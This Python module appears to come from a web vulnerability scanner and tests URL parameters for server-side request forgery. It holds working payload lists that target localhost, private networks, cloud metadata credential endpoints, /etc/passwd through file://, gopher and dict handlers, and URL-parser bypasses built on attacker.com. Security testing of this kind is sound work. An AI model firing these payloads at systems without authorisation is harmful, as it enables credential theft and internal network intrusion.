"""
Module: SSRF Scanner
- URL parameter injection
- Internal IP detection
- Cloud metadata detection
- DNS rebinding setup
"""

import re
import time
import socket
import hashlib
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote

from ..core.finding import Finding
from ..core.http_client import AdaptiveHTTPClient


class SSRFScanner:
    """Server-Side Request Forgery scanner"""

    def __init__(self, client: AdaptiveHTTPClient, callback_domain: str = None):
        self.client = client
        self.callback_domain = callback_domain  # For OOB detection (e.g., interactsh)
        self.findings: List[Finding] = []

    def _generate_ssrf_payloads(self, unique_id: str) -> List[Dict]:
        """Generate SSRF payloads for various bypass techniques"""

        payloads = []

        # Localhost variants
        localhost_variants = [
            "http://localhost",
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
            "http://127.1",
            "http://127.000.000.001",
            "http://0.0.0.0",
            "http://0",
            "http://[::1]",
            "http://[0:0:0:0:0:0:0:1]",
            "http://localhost.localdomain",
            "http://127.0.0.1.nip.io",
            "http://0177.0.0.1",  # Octal
            "http://0x7f.0.0.1",  # Hex
            "http://2130706433",  # Decimal
        ]

        for url in localhost_variants:
            payloads.append({
                'payload': url,
                'type': 'localhost_bypass',
                'target': 'localhost',
                'description': f'Localhost via {url}',
            })

        # Internal networks
        internal_ranges = [
            "http://10.0.0.1",
            "http://10.10.10.10",
            "http://172.16.0.1",
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://169.254.169.254",  # AWS metadata
        ]

        for url in internal_ranges:
            payloads.append({
                'payload': url,
                'type': 'internal_network',
                'target': 'internal',
                'description': f'Internal network probe: {url}',
            })

        # Cloud metadata endpoints
        cloud_metadata = [
            ("http://169.254.169.254/latest/meta-data/", "AWS"),
            ("http://169.254.169.254/latest/user-data/", "AWS"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP"),
            ("http://169.254.169.254/metadata/v1/", "DigitalOcean"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"),
            ("http://100.100.100.200/latest/meta-data/", "Alibaba"),
        ]

        for url, cloud in cloud_metadata:
            payloads.append({
                'payload': url,
                'type': 'cloud_metadata',
                'target': cloud,
                'description': f'{cloud} metadata endpoint',
            })

        # Protocol handlers
        protocols = [
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "gopher://localhost:25/",
            "dict://localhost:11211/",
        ]

        for proto in protocols:
            payloads.append({
                'payload': proto,
                'type': 'protocol',
                'target': proto.split(':')[0],
                'description': f'Protocol handler: {proto[:30]}',
            })

        # URL bypass techniques
        bypass_patterns = [
            "http://localhost%2523@attacker.com",
            "http://attacker.com@localhost",
            "http://localhost%00.attacker.com",
            "http://localhost#.attacker.com",
            "http://localhost?.attacker.com",
            "http://localhost\\.attacker.com",
        ]

        for url in bypass_patterns:
            payloads.append({
                'payload': url,
                'type': 'url_bypass',
                'target': 'localhost',
                'description': f'URL parser bypass',
            })

        # DNS rebinding / callback payloads
        if self.callback_domain:
            payloads.append({
                'payload': f"http://{unique_id}.{self.callback_domain}",
                'type': 'oob_callback',
                'target': 'callback',
                'description': 'OOB callback detection',
            })

        return payloads

    def _find_url_parameters(self, url: str, html: str = None) -> List[Dict]:
        """Find parameters that might accept URLs"""
        candidates = []

        # URL parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        url_param_hints = ['url', 'uri', 'link', 'href', 'src', 'path', 'page',
                          'file', 'document', 'folder', 'root', 'dir', 'img',
                          'image', 'load', 'fetch', 'retrieve', 'proxy', 'redirect',
                          'next', 'return', 'target', 'dest', 'destination',
                          'view', 'show', 'site', 'host', 'callback', 'feed']

        for param, values in params.items():
            param_lower = param.lower()
            # Check if param name suggests URL handling
            if any(hint in param_lower for hint in url_param_hints):
                candidates.append({
                    'param': param,
                    'value': values[0] if values else '',
                    'source': 'url',
                    'confidence': 0.9,
                })
            # Check if value looks like a URL
            elif values and values[0].startswith(('http://', 'https://', '//')):
                candidates.append({
                    'param': param,
                    'value': values[0],
                    'source': 'url',
                    'confidence': 0.95,
                })

        return candidates

    def _analyze_response_for_ssrf(self, response_text: str, status_code: int,
                                   payload: Dict) -> Optional[Dict]:
        """Analyze response to detect SSRF success"""
        result = None
        text_lower = response_text.lower()

        # AWS metadata indicators
        if payload['type'] == 'cloud_metadata' and payload['target'] == 'AWS':
            aws_indicators = ['ami-id', 'instance-id', 'instance-type',
                             'security-credentials', 'iam', 'meta-data']
            if any(ind in text_lower for ind in aws_indicators):
                result = {
                    'confirmed': True,
                    'type': 'aws_metadata',
                    'evidence': 'AWS metadata response detected',
                }

        # GCP metadata
        elif payload['type'] == 'cloud_metadata' and payload['target'] == 'GCP':
            if 'computeMetadata' in response_text or 'project-id' in text_lower:
                result = {
                    'confirmed': True,
                    'type': 'gcp_metadata',
                    'evidence': 'GCP metadata response detected',
                }

        # Local file read
        elif payload['type'] == 'protocol' and 'file://' in payload['payload']:
            file_indicators = ['root:', '/bin/', 'daemon:', '/sbin/',
                              '[boot loader]', '[operating systems]']
            if any(ind in response_text for ind in file_indicators):
                result = {
                    'confirmed': True,
                    'type': 'local_file',
                    'evidence': 'Local file content in response',
                }

        # Localhost access
        elif payload['type'] in ['localhost_bypass', 'internal_network']:
            # Check for common localhost response patterns
            localhost_indicators = [
                'apache', 'nginx', 'iis', 'server at localhost',
                '127.0.0.1', '<html', 'index of /', 'welcome',
            ]
            # Also check if response differs significantly from normal error
            if status_code == 200 and len(response_text) > 100:
                if any(ind in text_lower for ind in localhost_indicators):
                    result = {
                        'confirmed': True,
                        'type': 'internal_access',
                        'evidence': f'Internal server response (status={status_code})',
                    }

        return result

    def _test_ssrf(self, url: str, param: str, original_value: str) -> List[Finding]:
        """Test a parameter for SSRF"""
        findings = []
        unique_id = hashlib.md5(f"{url}{param}{time.time()}".encode()).hexdigest()[:8]

        payloads = self._generate_ssrf_payloads(unique_id)

        for payload_info in payloads:
            payload = payload_info['payload']

            try:
                # Build test URL
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]

                query_string = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                # Send request with timeout
                resp = self.client.get(test_url, timeout=10, allow_redirects=False)

                # Analyze response
                result = self._analyze_response_for_ssrf(
                    resp.text, resp.status_code, payload_info
                )

                if result and result.get('confirmed'):
                    severity = "CRITICAL" if payload_info['type'] == 'cloud_metadata' else "HIGH"

                    findings.append(Finding(
                        vuln_class="Server-Side Request Forgery (SSRF)",
                        severity=severity,
                        cvss=9.1 if severity == "CRITICAL" else 7.5,
                        url=test_url,
                        parameter=param,
                        description=f"SSRF confirmed via {payload_info['type']}: {payload_info['description']}",
                        evidence={
                            'payload': payload,
                            'payload_type': payload_info['type'],
                            'target': payload_info['target'],
                            'detection': result['type'],
                            'response_length': len(resp.text),
                        },
                        remediation=[
                            "Validate and whitelist allowed URLs/domains",
                            "Block requests to internal IP ranges (RFC1918)",
                            "Block cloud metadata IPs (169.254.169.254)",
                            "Use allowlist for protocols (only http/https)",
                            "Implement network segmentation",
                            "Disable unused URL schemes (file://, gopher://)",
                        ],
                        tags=["ssrf", payload_info['type']],
                    ))

                    # Return immediately for critical findings
                    if severity == "CRITICAL":
                        return findings

            except Exception:
                continue

        return findings

    def scan(self, base_url: str) -> List[Finding]:
        """Run SSRF scan"""
        self.findings = []

        try:
            resp = self.client.get(base_url, timeout=15)
        except Exception:
            return self.findings

        # Find URL-accepting parameters
        candidates = self._find_url_parameters(base_url, resp.text)

        for candidate in candidates:
            findings = self._test_ssrf(base_url, candidate['param'], candidate['value'])
            self.findings.extend(findings)

        return self.findings
